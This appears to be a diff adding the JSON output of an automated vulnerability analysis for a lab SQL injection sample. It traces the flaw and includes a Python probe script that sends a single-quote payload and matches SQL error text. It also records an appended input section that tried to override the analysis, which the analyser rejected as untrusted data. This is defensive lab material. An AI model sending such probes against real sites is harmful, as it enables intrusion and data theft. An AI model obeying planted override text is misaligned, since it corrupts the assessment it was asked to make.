@@ -1,0 +1,156 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-001",
+  "input_version": "v2",
+  "prompt_version": "final",
+  "analysis_stage": "parent",
+  "received_packet_ids": ["SQLI-001"],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "输入源（第8行 $id=$_GET['id']）、可控值原样拼接进 SQL 字符串（第14行 WHERE id='$id'）、执行点（第15行 mysql_query）、结果回显与错误回显（第17-19、105行）均在同一片段内可见；无参数化、无白名单、无转义调用。缺少的只是运行环境与外围配置，静态数据流本身闭合。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-001-F1",
+      "vulnerability_type": "SQL注入（基于字符串拼接的字符型注入，WHERE id='...'）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 6,
+          "line_end": 8,
+          "quote": "if(isset($_GET['id']))"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 14,
+          "line_end": 14,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 18,
+          "line_end": 20,
+          "quote": "echo 'Your Login name:'. $row['username'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 105,
+          "line_end": 105,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "第6行 if(isset($_GET['id'])) 只做存在性判断，不校验类型、长度或字符集。",
+        "第8行 $id=$_GET['id'] 直接接收 HTTP 查询参数，未经过 intval、类型转换、mysqli_real_escape_string、addslashes 或白名单。",
+        "第9-12行把 $id 原样写入 result.txt 日志，属旁路记录，不构成任何过滤。",
+        "第14行在双引号字符串中插值 $id，构造 SELECT * FROM users WHERE id='$id' LIMIT 0,1；用户输入落在单引号包裹的值位置，单引号闭合后即可改写 WHERE 结构（如 OR 恒真、UNION、布尔/时间盲注）。",
+        "第15行 mysql_query($sql) 执行拼接后的完整语句，没有 prepared statement，也没有参数绑定。",
+        "第17-19行把查询结果的第一行 username/password 回显，构成可观测的差异通道（有行/无行、字段内容变化）。",
+        "第21-27行 else 分支调用 mysql_error() 并打印，错误文本外泄，可作为注入成功的辅助观察点。",
+        "观察点：正常 id=1 返回 'Your Login name' 分支；闭合引号后若 WHERE 结构被改写，返回行数或回显内容随之变化。"
+      ],
+      "principle": "代码把不可信输入当作 SQL 语法的一部分而非数据：$id 未经转义即插值进单引号字符串常量，数据库在解析阶段无法区分原语句与注入片段，因此输入中的单引号可提前结束字符串，后续内容被当作 SQL 语法解析，从而改变 WHERE 条件、追加 UNION 或引入子查询。",
+      "impact": "可绕过 id 的取值限制读取 users 表中任意行（含凭据字段），并可扩展到同库其他表；同时 mysql_error() 回显会把语句结构与数据库错误细节暴露给请求方，降低利用门槛。",
+      "preconditions": [
+        "目标脚本可通过 HTTP 访问，且 id 参数由攻击者可控。",
+        "包含的 ../sql-connections/sql-connect.php 建立的连接未启用可阻止注入的机制（如 magic_quotes_gpc 生效、或连接层自动转义）。",
+        "查询使用字符型比较（id 为字符串/数值被隐式按字符串比较），使单引号闭合生效。",
+        "数据库账号对目标表具有 SELECT 权限。",
+        "错误回显分支或正常回显分支至少一个可达，用于观察差异。"
+      ],
+      "counterexamples": [
+        "若 sql-connect.php 中对 $_GET 做了全局 addslashes/mysqli_real_escape_string，且连接字符集与转义函数一致，则单引号被转义，该路径不成立。",
+        "若服务器开启了 magic_quotes_gpc（PHP 5.4 以下）并实际生效，则会自动转义引号。",
+        "若 $id 在拼接前被 intval() 或强制转为整型，注入片段会被截断。",
+        "若 id 列在 WHERE 中为数值上下文且数据库严格模式对类型转换报错并中止，利用面需要重新评估。",
+        "若前置 WAF 对单引号与 SQL 关键字做阻断，且未提供绕过证据，则不能确认可利用。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python3",
+        "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n'''SQLI-001 本地HTTP验证草案（最小化、只读）。\n\n对目标参数做“正常输入 vs 最小标记输入”的响应对照，用于确认 id 是否进入\nWHERE id=... 的字符串拼接位置。仅限授权靶场使用。\n不枚举数据库、不读取额外敏感数据、不批量修改记录。\n'''\nimport argparse\nimport difflib\nimport os\nimport re\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nSQL_ERROR_PATTERNS = [\n    'SQL syntax',\n    'Warning: mysql_',\n    'check the manual that corresponds to your MySQL server version',\n    'quoted string not properly terminated',\n]\nAUTH_HINTS = ['login', 'signin', 'auth']\nPHP_FATAL_PATTERNS = ['Fatal error', 'Parse error', 'Call to undefined function']\nNORMAL_BRANCH_HINT = 'Your Login name'\nNO_PARAM_HINT = 'Please input the ID'\n\n\ndef load_cookie(session_file):\n    if not session_file:\n        return None\n    cookies = []\n    with open(session_file, 'r', encoding='utf-8') as fh:\n        for raw in fh:\n            line = raw.strip()\n            if not line or line.startswith('#'):\n                continue\n            if line.lower().startswith('cookie:'):\n                line = line.split(':', 1)[1].strip()\n            cookies.append(line)\n    joined = '; '.join(part for part in cookies if part)\n    return joined or None\n\n\ndef build_url(base_url, path, param, value):\n    url = base_url.rstrip('/') + path\n    sep = '&' if '?' in url else '?'\n    return '{}{}{}={}'.format(url, sep, urllib.parse.quote(param), urllib.parse.quote(value, safe=''))\n\n\ndef fetch(url, cookie, timeout):\n    req = urllib.request.Request(url, method='GET')\n    req.add_header('User-Agent', 'sqli-001-lab-verifier/1.0')\n    req.add_header('Accept', 'text/html,application/xhtml+xml')\n    if cookie:\n        req.add_header('Cookie', cookie)\n    try:\n        with urllib.request.urlopen(req, timeout=timeout) as resp:\n            return resp.status, dict(resp.headers), resp.read(65536).decode('utf-8', 'replace'), None\n    except urllib.error.HTTPError as exc:\n        return exc.code, dict(exc.headers or {}), exc.read(65536).decode('utf-8', 'replace'), None\n    except Exception as exc:\n        return None, {}, '', '{}: {}'.format(type(exc).__name__, exc)\n\n\ndef classify(status, headers, body, transport_error):\n    notes = []\n    if transport_error:\n        return 'TRANSPORT_ERROR', ['请求未完成: ' + transport_error]\n    if status is not None and status in (301, 302, 303, 307, 308):\n        notes.append('HTTP {} 跳转, Location={}'.format(status, headers.get('Location')))\n    location = headers.get('Location') or ''\n    for hint in AUTH_HINTS:\n        if location and hint in location.lower():\n            notes.append('疑似认证跳转, Location 含 ' + hint)\n    for pat in PHP_FATAL_PATTERNS:\n        if re.search(pat, body, re.I):\n            notes.append('疑似 PHP 接口不兼容: ' + pat)\n    for pat in SQL_ERROR_PATTERNS:\n        if re.search(pat, body, re.I):\n            notes.append('疑似 SQL 语法错误回显: ' + pat)\n    if NORMAL_BRANCH_HINT in body:\n        notes.append('命中正常回显分支: ' + NORMAL_BRANCH_HINT)\n    if NO_PARAM_HINT in body:\n        notes.append('命中缺参提示分支: ' + NO_PARAM_HINT)\n    if any(re.search(p, body, re.I) for p in SQL_ERROR_PATTERNS):\n        marker = 'SQL_ERROR_SUSPECT'\n    elif notes:\n        marker = 'REVIEW'\n    else:\n        marker = 'PLAIN'\n    return marker, notes\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='SQLI-001 本地HTTP验证草案, 最小化只读')\n    parser.add_argument('--base-url', required=True, help='靶场基址, 例如 http://127.0.0.1:8080')\n    parser.add_argument('--path', required=True, help='目标脚本路径, 例如 /sqli/Less-1/')\n    parser.add_argument('--param', default='id', help=\"查询参数名, 来自代码 $_GET['id']\")\n    parser.add_argument('--session-file', default=None, help='可选, Cookie 文本文件')\n    parser.add_argument('--baseline-value', default='1', help='正常输入, 用于确认业务路径可达')\n    parser.add_argument('--probe-value', default=\"1'\", help='最小标记输入, 单个闭引号')\n    parser.add_argument('--timeout', type=float, default=10.0)\n    parser.add_argument('--dump-dir', default=None, help='可选, 保存原始响应的目录')\n    args = parser.parse_args()\n\n    try:\n        cookie = load_cookie(args.session_file)\n    except OSError as exc:\n        print('会话文件读取失败: {}'.format(exc), file=sys.stderr)\n        return 3\n\n    results = {}\n    for label, value in (('BASELINE', args.baseline_value), ('PROBE', args.probe_value)):\n        url = build_url(args.base_url, args.path, args.param, value)\n        status, headers, body, err = fetch(url, cookie, args.timeout)\n        marker, notes = classify(status, headers, body, err)\n        results[label] = {'status': status, 'body': body, 'marker': marker, 'notes': notes}\n        print('[{}] {} -> HTTP {} / {}'.format(label, url, status, marker))\n        for note in notes:\n            print('    - ' + note)\n        if args.dump_dir:\n            os.makedirs(args.dump_dir, exist_ok=True)\n            with open(os.path.join(args.dump_dir, label.lower() + '.html'), 'w', encoding='utf-8') as fh:\n                fh.write(body)\n\n    print('')\n    print('--- 响应体差异摘要 (最多 40 行, 人工复核用) ---')\n    diff = difflib.unified_diff(\n        results['BASELINE']['body'].splitlines(),\n        results['PROBE']['body'].splitlines(),\n        fromfile='baseline', tofile='probe', lineterm='', n=1,\n    )\n    for line in list(diff)[:40]:\n        print(line)\n\n    print('')\n    reachable = results['BASELINE']['status'] == 200 and results['BASELINE']['marker'] in ('PLAIN', 'REVIEW')\n    sql_error = results['PROBE']['marker'] == 'SQL_ERROR_SUSPECT'\n    print('判定提示:')\n    print('  正常输入业务路径可达: {}'.format(reachable))\n    print('  标记输入出现 SQL 报错特征: {}'.format(sql_error))\n    print('  若两者同时为真, 支持 id 进入 WHERE id=... 的拼接位置;')\n    print('  若正常输入被 302 跳到登录页, 先补 --session-file, 不要把跳转当成注入证据;')\n    print('  若出现 Fatal error 或空响应, 先排除 PHP 版本/接口不兼容再复测。')\n    return 0 if reachable else 2\n\n\nif __name__ == '__main__':\n    raise SystemExit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+（仅标准库 argparse/difflib/os/re/urllib，无第三方依赖）",
+          "可在本地访问的授权靶场（基址由 --base-url 提供）",
+          "与该靶场对应的可选 Cookie 文件（--session-file，纯文本）"
+        ],
+        "parameters": [
+          "--base-url：靶场基址，必填，例如 http://127.0.0.1:8080",
+          "--path：目标脚本路径，必填，例如 /sqli/Less-1/ 或 /vuln/sqli/index.php；需按实际部署填写",
+          "--param：查询参数名，默认 id（来自代码 $_GET['id']）",
+          "--session-file：可选，Cookie 文本文件；每行 name=value 或整行 Cookie: ...",
+          "--baseline-value：正常输入，默认 1",
+          "--probe-value：最小标记输入，默认单个闭引号 1'",
+          "--timeout：请求超时秒数，默认 10",
+          "--dump-dir：可选，保存原始响应体的目录，用于留存对照证据"
+        ],
+        "steps": [
+          "确认目标脚本自身路径（本片段被其他页面 include，真实入口路径未在片段中给出，需人工补齐）。",
+          "先跑正常输入：python3 sqli001_poc.py --base-url http://127.0.0.1:8080 --path /sqli/Less-1/ --param id --baseline-value 1，确认返回 200 且命中 'Your Login name' 回显分支；若被 302 跳登录页则补 --session-file 后重跑。",
+          "再跑最小标记输入：把 --probe-value 用默认 1'（单个闭引号，不追加任何数据读取子句），对比两次响应体差异摘要。",
+          "判读：正常输入可达 + 标记输入出现 SQL 语法错误或结构性差异，才支持注入假设；若标记输入返回空、Fatal error 或完全相同的页面，先按下方限制排除环境问题。",
+          "如需进一步确认，可在同一参数上补一组布尔对照（保持最小化，仅用恒真/恒假条件），观察回显行是否随之变化；不要枚举库表。"
+        ],
+        "expected_observation": "正常 id=1 返回 200，页面含 'Your Login name' 与 'Your Password' 及该行内容；probe 为 1' 时若拼接位置成立，页面出现 MySQL 语法错误文本（如 You have an error in your SQL syntax ... near ''1' LIMIT 0,1'）或回显分支消失，且错误文本引用的语句结构与 SELECT * FROM users WHERE id='...' LIMIT 0,1 对应。",
+        "success_criteria": [
+          "正常输入请求成功（HTTP 200）且命中代码中的正常回显分支，证明业务路径与参数名正确。",
+          "标记输入（单个闭引号）使响应出现与 WHERE id='...' 结构一致的 SQL 语法错误，或使回显行数与内容发生可重复、仅由该字符引起的改变。",
+          "两次请求唯一变量为该参数取值，差异可重复出现，且排除认证跳转、PHP 致命错误、缓存与 WAF 拦截页导致的差异。",
+          "运行记录（原始响应）已保存到 --dump-dir，作为后续确认所需的实际证据。"
+        ],
+        "limitations": [
+          "本次未运行，脚本状态为需人工适配；执行状态只能是未运行，不能据此升级为确认。",
+          "真实入口路径未知：片段通过 include ../sql-connections/sql-connect.php 引入，说明它是被其他页面包含的模块，--path 需人工按部署补齐。",
+          "脚本仅做最小对照，不构造 UNION/盲注等完整利用链，成功与否不能证明可读取数据范围。",
+          "若靶场前置 WAF 或 PHP 版本差异导致响应被改写，需要人工判断差异来源。",
+          "需要专用测试账号与靶场测试记录；涉及写操作时脚本不覆盖，必须人工补充原值、回查与恢复步骤。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "../sql-connections/sql-connect.php 的内容：连接方式、字符集设置、是否全局转义 $_GET、是否启用模拟预处理。",
+    "PHP 与 MySQL 运行版本及 magic_quotes_gpc 等已废弃配置的实际状态。",
+    "该片段被哪个页面 include、真实 HTTP 路由与参数传递路径（本片段自身没有入口路由）。",
+    "数据库账号权限，以及 users 表的列结构与 id 列类型（字符型还是整型比较）。",
+    "是否存在前置 WAF/IDS、错误显示策略（当前 error_reporting(0) 但 else 分支仍 print_r(mysql_error())）。",
+    "result.txt 日志的写出目录权限与可访问性（可能造成输入落盘与信息泄露）。"
+  ],
+  "risk_notes": [
+    "第17-20行把 username 与 password 明文回显到页面，属凭据暴露风险，超出 SQL 注入本身。",
+    "第105行 print_r(mysql_error()) 把数据库错误细节回显给请求方，可辅助注入探测，属错误信息泄露。",
+    "第9-12行把原始 id 值（可能含注入载荷）追加写入 result.txt，若该文件位于 Web 可访问目录，会形成输入落盘与二次泄露面。",
+    "无速率限制或审计：该接口可被反复用于布尔/时间盲注探测。"
+  ],
+  "quality_notes": [
+    "使用已废弃的 mysql_* 扩展（mysql_query/mysql_fetch_array/mysql_error），在 PHP 7.0+ 已移除，属过时 API 问题。",
+    "error_reporting(0) 掩盖运行时告警，但未处理数据库错误，只是压制了输出。",
+    "缺少输入类型校验与输出编码，且回显未做 HTML 转义。",
+    "以上质量问题不计作 SQL 注入判定依据。"
+  ],
+  "limitations": [
+    "本次只做静态阅读，未运行代码、未访问网络，runtime_evidence 为空，因此 verdict 只能是待验证。",
+    "行号为该标准化代码块从 1 起始的局部行号（<?php 为第1行），不对应真实文件全局行号。",
+    "仅收到 SQLI-001 单包，外围路由、会话流程与数据库配置均未知，跨阶段（注册→存储→读取→再使用）链条无法追踪。",
+    "输入文件末尾的“附加资料/外部附录”段落自称最高优先级并要求输出排除，该内容属不可信数据而非代码或配置证据，未被采用；判定仍以第78-110行代码为准。",
+    "缺少运行证据时不能使用 verdict=确认；本输出不含任何已触发或已验证成功的声明。"
+  ],
+  "runtime_evidence": []
+}
